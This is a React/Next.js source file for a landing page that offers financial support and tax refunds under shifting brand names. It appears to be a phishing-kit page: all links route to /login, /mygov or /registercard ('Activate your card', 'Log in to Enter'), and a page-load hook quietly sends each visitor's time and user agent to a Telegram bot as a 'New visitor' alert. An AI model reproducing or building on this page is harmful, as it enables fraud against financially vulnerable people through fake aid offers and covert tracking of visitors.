/* eslint-disable @next/next/no-img-element */
'use client';

import React, { useState, useEffect } from "react";
import { sendTelegramMessage } from '../utils/telegram'; // Import from your utils folder

const steps = [
  {
    title: "Easy Application for Support",
    content: "We've made it simple for you to ask for help. Our quick online form takes just a few minutes to complete — no stress, no long paperwork.",
  },
  {
    title: "Fast & Compassionate Review",
    content: "We know time matters. That's why our team reviews every request with care and urgency — you'll hear back from us within 24 hours.",
  },
  {
    title: "Your Information is Safe with Us",
    content: "We treat your personal details with the utmost respect. Everything you share is kept private and protected by strong security measures.",
  },
  {
    title: "Support That is Fair and Thoughtful",
    content: "Every application is reviewed with empathy and fairness, so that assistance reaches those who truly need it most.",
  },
  {
    title: "We are With You Every Step",
    content: "Once you apply, we will stay in touch to update you on your request and help guide you through what comes next. You're not alone.",
  },
];

const TaxRefundPage: React.FC = () => {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [activeTab, setActiveTab] = useState(steps[0].title);
  const [isMobile, setIsMobile] = useState(false);
  const [openTabs, setOpenTabs] = useState<boolean[]>(new Array(steps.length).fill(false));
  const [notificationSent, setNotificationSent] = useState(false);

  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth < 768);
    };
    handleResize();
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  // Send Telegram notification when page loads
  useEffect(() => {
    // Only send notification once per session
    if (!notificationSent) {
      const message = `🚨 New visitor on UNAP!\nTime: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
      sendTelegramMessage(message);
      setNotificationSent(true);
    }
  }, [notificationSent]);

  const toggleMenu = () => setIsMenuOpen(!isMenuOpen);
  const toggleAccordion = (index: number) => {
    setOpenTabs(prev => {
      const newTabs = [...prev];
      newTabs[index] = !newTabs[index];
      return newTabs;
    });
  };

  return (
    <div className="page-container bg-white text-black">
      <header className="header bg-white text-black flex justify-between items-center p-6 shadow-md sticky top-0 z-50">
        <div className="logo-container">
          <a >
          <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3" />
          </a>
        </div>

        {/* Mobile Navigation */}
        <div className="md:hidden flex items-center space-x-4">
          <a
            href="/mygov"
            className="bg-green-500 text-black px-4 py-2 rounded-lg hover:bg-green-600 transition duration-300 text-sm"
          >
            Apply Now
          </a>
          <button onClick={toggleMenu} className="text-black focus:outline-none">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              className="w-8 h-8"
            >
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16" />
            </svg>
          </button>
        </div>

        {/* Desktop Navigation */}
        <nav className="nav-menu hidden md:flex space-x-8 font-medium text-sm md:text-base">
          <a href="/login" className="hover:text-green-500 transition duration-300">Products</a>
          <a href="/login" className="hover:text-green-500 transition duration-300">Benefits</a>
          <a href="/login" className="hover:text-green-500 transition duration-300">Partners</a>
          <a href="/login" className="hover:text-green-500 transition duration-300">About Us</a>
          <a href="/login" className="hover:text-green-500 transition duration-300">Help</a>
        </nav>

        <div className="hidden md:flex space-x-4">
          <a href="/login" className="text-black hover:text-green-500 transition duration-300">Log in</a>
          <a href="/registercard" className="bg-black text-white px-4 py-2 rounded-lg hover:bg-green-500 transition duration-300">
            Activate
          </a>
          <a href="/mygov" className="bg-green-500 text-black px-4 py-2 rounded-lg hover:bg-green-600 transition duration-300">
            Apply
          </a>
        </div>
      </header>

      {/* Mobile Menu */}
      {isMenuOpen && (
        <nav className="md:hidden bg-white text-black space-y-4 p-4">
          {["Products", "Benefits", "Partners", "About Us", "Help", "Login"].map((item) => (
            <a key={item} href="/login" className="block hover:text-green-500">
              {item}
            </a>
          ))}
          <a href="/registercard" className="block bg-black text-white px-5 py-2 rounded-lg hover:bg-green-500 transition duration-300">
            Activate your card
          </a>
          <a href="/mygov" className="block bg-green-500 text-black px-5 py-2 rounded-lg hover:bg-green-600 transition duration-300">
            Apply
          </a>
        </nav>
      )}

      <main>

      <section className="p-6 md:p-10 bg-gray-50">
  <h2 className="text-2xl md:text-3xl font-bold text-center mb-8">
    How It Works
  </h2>
  
  {/* Wrapper for Flexbox Layout */}
  <div className="flex flex-col md:flex-row items-center justify-center md:space-x-10 space-y-6 md:space-y-0">
    
    {/* Step 1 */}
    <div className="flex items-center space-x-4">
      <img src="/submit.png" alt="Submit Application" className="w-12 h-12" />
      <div>
  <h3 className="font-bold">Submit Your Request for Support</h3>
  <p className="text-sm text-gray-600">Tell us about your situation and how we can help you move forward. Every story matters.</p>
</div>

      <span className="hidden md:inline-block text-xl text-orange-500">➡</span>
    </div>

    {/* Step 2 */}
    <div className="flex items-center space-x-4">
      <img src="/stopwatch.png" alt="Review Process" className="w-12 h-12" />
      <div>
  <h3 className="font-bold">Get a Prompt & Caring Response</h3>
  <p className="text-sm text-gray-600">Our team will carefully review your request and reach out with next steps—usually within 24 hours.</p>
</div>

      <span className="hidden md:inline-block text-xl text-orange-500">➡</span>
    </div>

    {/* Step 3 */}
    <div className="flex items-center space-x-4">
      <img src="/moneyhand.png" alt="Funding Disbursement" className="w-12 h-12" />
      <div>
  <h3 className="font-bold">Receive the Support You Need</h3>
  <p className="textsm text-gray-600">Once approved, you will receive the assistance to help ease your situation and take your next steps forward.</p>
</div>

    </div>

  </div>
</section>


        {/* Hero Section */}
        <section className="flex flex-col md:flex-row items-center p-6 md:p-10 gap-8">
  {/* First Section - Image on Right */}
  <div className="w-full md:w-1/2 text-center md:text-left">
  <h2 className="text-3xl md:text-4xl font-bold mb-4">
  Supporting You When It Matters Most
</h2>
<p className="text-lg md:text-xl mb-4">
  We believe help should be within reach—no matter your financial background. Our support is built on trust, empathy, and your real-life needs, not just numbers. You are more than your circumstances, and we are here to walk with you toward stability and hope.
</p>


    
    <a
      href="/mygov"
      className="inline-block bg-green-500 text-black px-8 py-3 rounded-lg hover:bg-green-600 transition duration-300 text-lg font-semibold"
    >
      Log in to Enter
    </a>
  </div>
  <div className="w-full md:w-1/2">
    {/* Mobile Image */}
    <img
      src="/tax-center.png"
      alt="Tax Refund Mobile"
      className="w-full max-w-xl mx-auto rounded-xl shadow-lg md:hidden"
    />
    {/* Desktop Image */}
    <img
      src="/tax-center.png"
      alt="Tax Refund Desktop"
      className="w-full max-w-xl mx-auto rounded-xl shadow-lg hidden md:block"
    />
  </div>
</section>

{/* Second Section - Image on Left */}
<section className="flex flex-col md:flex-row-reverse items-center p-6 md:p-10 gap-8">
  <div className="w-full md:w-1/2 text-center md:text-left">
  <h2 className="text-3xl md:text-4xl font-bold mb-4">
  Quick & Compassionate Assistance
</h2>
<p className="text-lg md:text-xl mb-4">
  When life gets overwhelming, fast support can make all the difference. Our simple process means your request is reviewed with care—often within one business day—so you can get the help you need without added stress or delays.
</p>

    
    <a
      href="/mygov"
      className="inline-block bg-green-500 text-black px-8 py-3 rounded-lg hover:bg-green-600 transition duration-300 text-lg font-semibold"
    >
      Apply
    </a>
  </div>
  <div className="w-full md:w-1/2">
    {/* Mobile Image */}
    <img
      src="/tax-refund-win10k-mobile.svg"
      alt="Refer a Friend Mobile"
      className="w-full max-w-xl mx-auto rounded-xl shadow-lg md:hidden"
    />
    {/* Desktop Image */}
    <img
      src="/tax-refund-win10k-desktop.svg"
      alt="Refer a Friend Desktop"
      className="w-full max-w-xl mx-auto rounded-xl shadow-lg hidden md:block"
    />
  </div>
</section>

        {/* Steps Section */}
        <section className="p-6 md:p-10 bg-gray-50">
          <h2 className="text-2xl md:text-3xl font-bold text-center mb-8">
            Complete These Steps to Enter
          </h2>

          {!isMobile ? (
            // Desktop Tabs
            <div className="max-w-6xl mx-auto">
              <div className="flex flex-wrap justify-center gap-2 mb-6">
                {steps.map((step) => (
                  <button
                    key={step.title}
                    onClick={() => setActiveTab(step.title)}
                    className={`px-6 py-3 rounded-full font-semibold transition-colors ${
                      activeTab === step.title
                        ? 'bg-green-500 text-white'
                        : 'bg-white text-gray-600 hover:bg-gray-100'
                    }`}
                  >
                    {step.title}
                  </button>
                ))}
              </div>
              <div className="bg-white p-8 rounded-2xl shadow-sm">
                {steps.find((step) => step.title === activeTab)?.content}
              </div>
            </div>
          ) : (
            // Mobile Accordion
            <div className="max-w-2xl mx-auto">
              {steps.map((step, index) => (
                <div key={index} className="mb-4 bg-white rounded-xl shadow-sm overflow-hidden">
                  <button
                    onClick={() => toggleAccordion(index)}
                    className="w-full flex justify-between items-center px-6 py-4 font-semibold"
                  >
                    <span>{step.title}</span>
                    <span className={`text-green-500 text-xl transition-transform ${openTabs[index] ? 'rotate-45' : ''}`}>
                      +
                    </span>
                  </button>
                  {openTabs[index] && (
                    <div className="px-6 py-4 border-t border-gray-100">
                      {step.content}
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </section>
      </main>

      <footer className="bg-black text-white p-6 text-center">
        <p className="text-sm md:text-base">
          © 2025 UNARP Corporation. All rights reserved.
        </p>
      </footer>
    </div>
  );
};

export default TaxRefundPage;